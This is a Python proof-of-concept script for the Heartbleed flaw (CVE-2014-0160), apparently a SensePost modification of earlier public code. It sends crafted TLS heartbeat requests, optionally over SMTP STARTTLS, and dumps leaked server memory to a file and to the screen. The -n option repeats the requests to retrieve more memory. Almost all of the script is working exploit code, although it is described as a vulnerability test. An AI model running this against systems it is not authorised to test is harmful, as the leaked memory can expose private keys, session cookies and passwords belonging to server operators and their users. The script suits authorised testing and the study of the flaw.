#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 originally by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
# Modified by SensePost based on lots of other people's efforts (hard to work out credit via PasteBin)

from __future__ import print_function
from builtins import str
from builtins import range
import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser
import smtplib

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')
options.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory too (default: dump.bin)')
options.add_option('-q', '--quiet', default=False, help='Do not display the memory dump', action='store_true')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS (smtp only right now)')

def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hbv10 = h2bin('''
18 03 01 00 03
01 40 00
''')

hbv11 = h2bin('''
18 03 02 00 03
01 40 00
''')

hbv12 = h2bin('''
18 03 03 00 03
01 40 00
''')

def hexdump(s, dumpf, quiet):
	dump = open(dumpf,'a')
	dump.write(s)
	dump.close()
	if quiet: return
	for b in range(0, len(s), 16):
		lin = [c for c in s[b : b + 16]]
		hxdat = ' '.join('%02X' % ord(c) for c in lin)
		pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
		print('  %04x: %-48s %s' % (b, hxdat, pdat))
	print()

def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			if not rdata:
				return None
			else:
				return rdata
		r, w, e = select.select([s], [], [], 5)
		if s in r:
			data = s.recv(remain)
			# EOF?
			if not data:
				return None
			rdata += data
			remain -= len(data)
	return rdata

def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		print('Unexpected EOF receiving record header - server closed connection')
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		print('Unexpected EOF receiving record payload - server closed connection')
		return None, None, None
	print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
	return typ, ver, pay

def hit_hb(s, dumpf, host, quiet):
	while True:
		typ, ver, pay = recvmsg(s)
		if typ is None:
			print('No heartbeat response received from '+host+', server likely not vulnerable')
			return False

		if typ == 24:
			if not quiet: print('Received heartbeat response:')
			hexdump(pay, dumpf, quiet)
			if len(pay) > 3:
				print('WARNING: server '+ host +' returned more data than it should - server is vulnerable!')
			else:
				print('Server '+host+' processed malformed heartbeat, but did not return any extra data.')
			return True

		if typ == 21:
			if not quiet: print('Received alert:')
			hexdump(pay, dumpf, quiet)
			print('Server '+ host +' returned error, likely not vulnerable')
			return False

def connect(host, port, quiet):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	if not quiet: print('Connecting...')
	sys.stdout.flush()
	s.connect((host, port))
	return s

def tls(s, quiet):
	if not quiet: print('Sending Client Hello...')
	sys.stdout.flush()
	s.send(hello)
	if not quiet: print('Waiting for Server Hello...')
	sys.stdout.flush()

def parseresp(s):
	while True:
		typ, ver, pay = recvmsg(s)
		if typ == None:
			print('Server closed connection without sending Server Hello.')
			return 0
		# Look for server hello done message.
		if typ == 22 and ord(pay[0]) == 0x0E:
			return ver

def check(host, port, dumpf, quiet, starttls):
	response = False
	if starttls:
		try:
			s = smtplib.SMTP(host=host,port=port)
			s.ehlo()
			s.starttls()
		except smtplib.SMTPException:
			print('STARTTLS not supported...')
			s.quit()
			return False
		print('STARTTLS supported...')
		s.quit()
		s = connect(host, port, quiet)
		s.settimeout(1)
		try:
			re = s.recv(1024)
			s.send('ehlo starttlstest\r\n')
			re = s.recv(1024)
			s.send('starttls\r\n')
			re = s.recv(1024)
		except socket.timeout:
			print('Timeout issues, going ahead anyway, but it is probably broken ...')
		tls(s,quiet)
	else:
		s = connect(host, port, quiet)
		tls(s,quiet)

	version = parseresp(s)

	if version == 0:
		if not quiet: print("Got an error while parsing the response, bailing ...")
		return False
	else:
		version = version - 0x0300
		if not quiet: print("Server TLS version was 1.%d\n" % version)

	if not quiet: print('Sending heartbeat request...')
	sys.stdout.flush()
	if (version == 1):
		s.send(hbv10)
		response = hit_hb(s,dumpf, host, quiet)
	if (version == 2):
		s.send(hbv11)
		response = hit_hb(s,dumpf, host, quiet)
	if (version == 3):
		s.send(hbv12)
		response = hit_hb(s,dumpf, host, quiet)
	s.close()
	return response

def main():
	opts, args = options.parse_args()
	if len(args) < 1:
		options.print_help()
		return

	print('Scanning ' + args[0] + ' on port ' + str(opts.port))
	for i in range(0,opts.num):
		check(args[0], opts.port, opts.file, opts.quiet, opts.starttls)

if __name__ == '__main__':
	main()
